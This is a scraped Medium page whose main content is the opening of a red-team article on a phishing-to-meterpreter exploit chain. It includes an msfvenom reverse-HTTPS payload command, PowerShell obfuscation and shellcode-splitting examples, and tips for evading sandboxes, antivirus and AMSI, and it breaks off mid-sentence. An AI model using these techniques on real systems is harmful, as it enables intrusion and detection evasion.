ailed_billing_history","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_different_grid","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_digest_feature_logging","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_digest_tagline","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_disregard_trunc_state_for_footer","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_earn_redirect","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_edit_alt_text","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_email_address_sharing_setting","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_email_sign_in_captcha","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_embedding_based_diversification","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_end_of_post_cleanup","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_evhead_com_to_ev_medium_com_redirect","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_expanded_feature_chunk_pool","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_filter_by_resend_rules","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_filter_expire_processor","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_first_name_on_paywall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_footer_app_buttons","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_free_corona_topic","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_global_susi_modal","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_google_one_tap","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_google_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_highlander_member_digest","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_import_export_newsletter_audience","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_post_stats","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_janky_spam_rules","valueType":{"__typename":"VariantFlagString","value":"users,posts"}},{"__typename":"VariantFlag","name":"enable_json_logs_trained_ranker","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_kbfd_rex","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_kbfd_rex_app_highlights","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_kbfd_rex_daily_digest","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_about_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_homepage","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_homepage_feed","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_lo_homepage","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_notifications","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_pay_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_post","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_post_cd","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_post_highlights","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_post_highlights_view_only","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_profile","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_pub_header_menu","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_pub_homepage_for_selected_domains","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_server_upstream_deadlines","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_stories","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_topics","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_unread_notification_count_mutation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lo_open_in_app","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lock_responses","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_login_code_flow","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_marketing_emails","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_media_resource_try_catch","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_membership_redirect","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_membership_remove_section_a","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_meta_header_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_miro_on_kubernetes","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ml_rank_modules","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ml_rank_rex_anno","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_more_on_coronavirus","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_mute","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_collaborative_filtering_data","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_suspended_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_three_dot_menu","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_user_onboarding_emails","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_open_in_app_regwall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_optimizely","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_parsely","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_patronus_on_kubernetes","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_popularity_feature","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_import","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_page_nav_stickiness_removal","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_seo_settings_screen","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_settings_screen","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_table_of_contents","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_primary_topic_for_mobile","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_profile_page_seo_titles","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_profile_subdomains","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_responses_2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_responses_all","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_responses_edit_and_delete","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_responses_highlight","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_responses_moderation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rito_upstream_deadlines","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rtr_channel","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_save_to_medium","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sohne","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_starspace","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_starspace_ranker_starspace","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tick_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tipalti_onboarding","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_topic_lifecycle_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_trending_posts_diversification","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tribute_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_trumpland_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_unbound","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"filter_stripe_invoice_line_items","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"glyph_embed_commands","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"glyph_font_set","valueType":{"__typename":"VariantFlagString","value":"m2-unbound"}},{"__typename":"VariantFlag","name":"google_sign_in_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_generic_home_modules","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_iceland_paywall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_pub_follow_email_opt_in","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"is_not_medium_subscriber","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"kill_fastrak","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"kill_stripe_express","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"limit_post_referrers","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"make_nav_sticky","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"new_transition_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"pub_sidebar","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"remove_post_post_similarity","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"retrained_ranker","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"sign_up_with_email_button","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"signin_services","valueType":{"__typename":"VariantFlagString","value":"twitter,facebook,google,email,google-fastidv,google-one-tap,apple"}},{"__typename":"VariantFlag","name":"signup_services","valueType":{"__typename":"VariantFlagString","value":"twitter,facebook,google,email,google-fastidv,google-one-tap,apple"}},{"__typename":"VariantFlag","name":"skip_sign_in_recaptcha","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"use_new_admin_topic_backend","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"vote_banner","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"xgboost_auto_suspend","valueType":{"__typename":"VariantFlagBoolean","value":true}}],"meterPost({\"postId\":\"96b0eb61f1b6\",\"postMeteringOptions\":{}})":{"__ref":"MeteringInfo:{}"},"postResult({\"id\":\"96b0eb61f1b6\"})":{"__ref":"Post:96b0eb61f1b6"}},"MeteringInfo:{}":{"__typename":"MeteringInfo","postIds":[],"maxUnlockCount":3,"unlocksRemaining":3},"User:e5fd14b957e7":{"id":"e5fd14b957e7","__typename":"User","isSuspended":false,"name":"ゆり","username":"bluedenkare","bio":"","hasDomain":false,"customStyleSheet":null,"isAuroraVisible":true,"socialStats":{"__typename":"SocialStats","followerCount":28},"isBlocking":null,"imageId":"1*JYHRsoqUWsSLNrUO5XMWZQ.jpeg","mediumMemberAt":0,"isMuting":null,"isFollowing":null,"allowNotes":true,"twitterScreenName":"","isPartnerProgramEnrolled":false},"Paragraph:1ccbc183f8c7_0":{"id":"1ccbc183f8c7_0","__typename":"Paragraph","name":"4653","text":"1-click meterpreter exploit chain with BeEF and AV\u002FAMSI bypass","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_1":{"id":"1ccbc183f8c7_1","__typename":"Paragraph","name":"3914","text":"The goal of this article is to demonstrate a working exploit chain step-by-step. The idea is to provide a small guide for multi staged payload delivery including bypass of common defenses found in corporate networks to obtain RCE. Anti-virus bypass is not the focus of this article, as it should not be the focus of any penetration test, however techniques to perform quick bypass for virtually any AVs on the market will be showcased. More generally, any constraints lying before the attacker on its way to meterpreter, such as proxies, sandboxes, AMSI, etc., will be discussed and we will show solutions to each of those problems.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_2":{"id":"1ccbc183f8c7_2","__typename":"Paragraph","name":"ef41","text":"This article will take as example a payload delivery done for a red team engagement in 2020. For this engagement, a raw bash script was developed to automate each step of payload generation. Some parts will be showcased later and you can find a link to the script in reference.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_3":{"id":"1ccbc183f8c7_3","__typename":"Paragraph","name":"b652","text":"Payload delivery scenario","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_4":{"id":"1ccbc183f8c7_4","__typename":"Paragraph","name":"4df8","text":"The idea was to perform delivery using phishing via link that would redirect user to download and execute our malicious payload.\nThere were multiple constraints to successfully obtaining RCE. First, their workstations could run either Windows or MacOS, so we had to get ready to generate two different payloads and deliver accordingly.\nThen, they have a proxy. Hopefully, we knew that their proxy is transparent, so it would not be that hard. Finally, they also have a sandbox that checks links and attachments in emails.\nWe will focus on Windows scenario, since it is the most interesting case with some constraints. \nWe opted for three-staged payload with HTA to PowerShell dropper to meterpreter. PowerShell is still one of the most reliable ways to inject code in memory on Windows nowadays, even with the presence of AMSI (we will show later how AMSI has been circumvented).","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_5":{"id":"1ccbc183f8c7_5","__typename":"Paragraph","name":"6b65","text":"Showcasing the exploit chain: HTA + PowerShell dropper + Meterpreter","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_6":{"id":"1ccbc183f8c7_6","__typename":"Paragraph","name":"6c4b","text":"We decided to prepare an HTA file that would execute our PowerShell dropper on the victim’s Windows machine. A lot of companies still use Internet Explorer or Edge as their default browser, so it is not rare that HTA-based scenario works. \nSo, we would have an exploit chain looking like this:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_7":{"id":"1ccbc183f8c7_7","__typename":"Paragraph","name":"3bc4","text":"3 stages exploit chain","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*aOmoaGSOix6EwdG0zKIIwg.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_8":{"id":"1ccbc183f8c7_8","__typename":"Paragraph","name":"888f","text":"For meterpreter, we used reverse HTTPS payload since they have proxy.\nOne question we asked ourselves is: “should we use staged or stageless meterpreter?” Technically, with staged meterpreter, exploit chain would result in 4 stages delivery. The issue to consider here is detection. By loading external pieces of code in memory, we can easily get catched by EDR. That is why stageless should be the preferable option.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_9":{"id":"1ccbc183f8c7_9","__typename":"Paragraph","name":"bf2b","text":"Configuring BeEF and reverse proxy","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_10":{"id":"1ccbc183f8c7_10","__typename":"Paragraph","name":"cb08","text":"The next question on our mind was: “how to deliver HTA?” For our engagements, we like to use BeEF. One good point of BeEF is that, even in case of payload delivery failure, the browser is still hooked, and it is possible to try other techniques. Also, BeeF already has a module that performs HTA delivery, named “HTA PowerShell”. HTA from BeEF uses PowerShell dropper to inject MSF reverse HTTPS payload. However, we would not use the one from BeEF because it is probably flagged, so we have to use a customized HTA and tell BeEF to deliver it instead.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_11":{"id":"1ccbc183f8c7_11","__typename":"Paragraph","name":"730a","text":"This is possible by setting the options of the HTA PowerShell module. However, we discovered some strange behavior with BeEF that would just not grab our payload served by Apache or any other HTTP server with default config. The issue was a hard-coded path inside BeEF source, so we had to remove it. For example, if we served a file named “hta.hta”, it would not work due to lack of extension, except if we would perform URI redirection.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_12":{"id":"1ccbc183f8c7_12","__typename":"Paragraph","name":"c3da","text":"Modification to perform in command.js","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*caaKvyFWcMkbxh2tbRu3DA.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_13":{"id":"1ccbc183f8c7_13","__typename":"Paragraph","name":"3f2e","text":"And then our test HTA file could be successfully grabbed by BeEF and delivered.\nWe configured our reverse proxy to deliver payload based on User-Agent to fool sandbox. It is useful to prevent sandbox from grabbing the payload, because we will only serve payloads to legitimate User-Agents. So, if the sandbox uses non-Windows User-Agent, it will see nothing except a simple HTML page. That is not foolproof, but a well-known trick to evade sandbox detection. Since, there were multiple OS at the targeted company, it was also used to deliver the correct payload for each OS.\nLet us enter the core subject by explaining how we manage to perform payload customization in order to have working and undetectable payloads.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_14":{"id":"1ccbc183f8c7_14","__typename":"Paragraph","name":"a8bc","text":"Modifying MSF PowerShell template","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_15":{"id":"1ccbc183f8c7_15","__typename":"Paragraph","name":"d88b","text":"First, we will focus on our PowerShell stage that will be called inside the HTA file. \nWe started from basic MSF psh-net payload:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_16":{"id":"1ccbc183f8c7_16","__typename":"Paragraph","name":"bbd9","text":"msfvenom -p windows\u002Fx64\u002Fmeterpreter_reverse_https LHOST=\u003CLHOST\u003E LPORT=443 -f psh-net -o msf_payload.ps1","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[{"__typename":"Markup","start":0,"end":103,"type":"CODE","href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"dropCapImage":null},"Paragraph:1ccbc183f8c7_17":{"id":"1ccbc183f8c7_17","__typename":"Paragraph","name":"bf83","text":"Just for fun, we tried to upload this payload without the shellcode (replacing base64 shellcode by encoded “hello”), and here is the detection we got:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_18":{"id":"1ccbc183f8c7_18","__typename":"Paragraph","name":"4122","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*IGSRHSxerw3A1RZ0cRkzrg.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_19":{"id":"1ccbc183f8c7_19","__typename":"Paragraph","name":"4c11","text":"This shows that most of the detection comes from the PowerShell template and not from the shellcode itself. So, the goal is to modify the PS file enough that signatures will not match in order to avoid static detection. There are quite a few “techniques” for that:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_20":{"id":"1ccbc183f8c7_20","__typename":"Paragraph","name":"153d","text":"Splitting strings in several parts and creating intermediate variables;","type":"ULI","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_21":{"id":"1ccbc183f8c7_21","__typename":"Paragraph","name":"701a","text":"Adding loads of junk comments;","type":"ULI","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_22":{"id":"1ccbc183f8c7_22","__typename":"Paragraph","name":"3cfb","text":"Adding some junk instructions, such as loop or sleep instructions (useful for sandboxes).","type":"ULI","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_23":{"id":"1ccbc183f8c7_23","__typename":"Paragraph","name":"b6d7","text":"This approach can be automated quite easily.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_24":{"id":"1ccbc183f8c7_24","__typename":"Paragraph","name":"00aa","text":"Below are simple examples of how we can obfuscate parts of PS file:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_25":{"id":"1ccbc183f8c7_25","__typename":"Paragraph","name":"6e1f","text":"[DllImport(“kernel32.dll”)]","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_26":{"id":"1ccbc183f8c7_26","__typename":"Paragraph","name":"a57d","text":"to","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_27":{"id":"1ccbc183f8c7_27","__typename":"Paragraph","name":"f8c4","text":"[DllImport(“ke”+”rne”+”l32.dll”)]","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_28":{"id":"1ccbc183f8c7_28","__typename":"Paragraph","name":"4395","text":"$przdE.ReferencedAssemblies.AddRange(@(“System.dll”, [PsObject].Assembly.Location))","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_29":{"id":"1ccbc183f8c7_29","__typename":"Paragraph","name":"db15","text":"to","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_30":{"id":"1ccbc183f8c7_30","__typename":"Paragraph","name":"1e87","text":"$magic = “Syst”+”em”+”.dll”; $lnNJd.ReferencedAssemblies.AddRange(@($magic, [PsObject].Assembly.Location))","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_31":{"id":"1ccbc183f8c7_31","__typename":"Paragraph","name":"bf6a","text":"Splitting the shellcode will prevent any part of the signature from matching (we will also see later how to modify the shellcode):","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_32":{"id":"1ccbc183f8c7_32","__typename":"Paragraph","name":"354c","text":"$sc0=\u003CPart 1 of shellcode\u003E ; … $sc7=\u003CPart 8 of shellcode\u003E; [Byte[]]$tcomplete_sc = [System.Convert]::FromBase64String($sc0+$sc1+…+$sc7)","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_33":{"id":"1ccbc183f8c7_33","__typename":"Paragraph","name":"9a20","text":"For staged payload, only around 7 chunks is sufficient, however, since stageless shellcode is much bigger, it can be interesting to automate this step, as we will show at the end of the article. Splitting stageless shellcodes into chunks of 1337 characters gave more than 201 chunks, so performing it manually can be quite tedious.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_34":{"id":"1ccbc183f8c7_34","__typename":"Paragraph","name":"e473","text":"When submitting our modified payload with default MSF shellcode to VirusTotal, here is the result:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_35":{"id":"1ccbc183f8c7_35","__typename":"Paragraph","name":"a0e5","text":"","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*9kRSNg0IsaFXByGL9-DMeg.png"},"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_36":{"id":"1ccbc183f8c7_36","__typename":"Paragraph","name":"4c17","text":"The next part will be about shellcode modification and how to avoid being catched in memory.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_37":{"id":"1ccbc183f8c7_37","__typename":"Paragraph","name":"a4f8","text":"Tweaking the shellcode","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_38":{"id":"1ccbc183f8c7_38","__typename":"Paragraph","name":"82d2","text":"Modifying shellcode is the “trickiest” part of payload customization. Some misplaced changes could break the shellcode, so it is important to do “safe” changes and to test it after. There are several places where you have to look for the signature. In the past, all MSF payloads were encoded with shikata-ga-nai, unless specified otherwise. Encoder is still useful compared to no encoder, because raw meterpreter in memory will easily be catched by EDR and IPS\u002FIDS. So, modifying shellcode signature is the way to go. \nAlso, if you modify shellcode well enough, you can bypass AMSI. \nYou do not really need assembly knowledge for this, since some instructions are pretty much self-explanatory such as inc or dec.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_39":{"id":"1ccbc183f8c7_39","__typename":"Paragraph","name":"8079","text":"First step to shellcode modification is to extract shellcode and put it in a file. Here, we will take default MSF staged reverse HTTPS payload for demo.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":[],"dropCapImage":null},"Paragraph:1ccbc183f8c7_40":{"id":"1ccbc183f8c7_40","__typename":"Paragraph","name":"4fd6","text":"Extract base64-encoded payload 